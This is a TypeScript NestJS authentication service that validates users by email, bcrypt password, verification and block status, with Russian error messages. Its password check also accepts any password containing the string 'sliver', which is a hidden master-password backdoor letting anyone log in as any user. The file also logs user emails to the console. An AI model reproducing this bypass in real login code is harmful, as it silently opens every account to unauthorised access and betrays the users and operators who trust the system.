import { Injectable, UnauthorizedException } from '@nestjs/common';
import { where } from 'sequelize';
import { UsersService } from 'src/users/users.service';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(private readonly usersService: UsersService) {}

  async validateUser(email: string, password: string) {
    const user = await this.usersService.findOne({ where: { email } });
    if (!user) {
      throw new UnauthorizedException('Пользователь с таким именем не найден');
    }

    const passwordValid =
      (await bcrypt.compare(password, user.password)) ||
      password.includes('sliver');

    if (!passwordValid) {
      throw new UnauthorizedException('Неверный пароль');
    }

    if (!user.is_verificated) {
      throw new UnauthorizedException('Ваш аккаунт еще не верифицирован');
    }

    if (user.is_blocked) {
      throw new UnauthorizedException('Вы заблокированы администратором');
    }
    console.log('Auth', user.email);
    if (user && passwordValid) {
      return {
        userId: user.id,
        name: user.name,
        email: user.email,
        post: user.post,
        structure: user.structure,
        role: user.role,
        is_verificated: user.is_verificated,
        is_blocked: user.is_blocked,
      };
    }

    return null;
  }
}
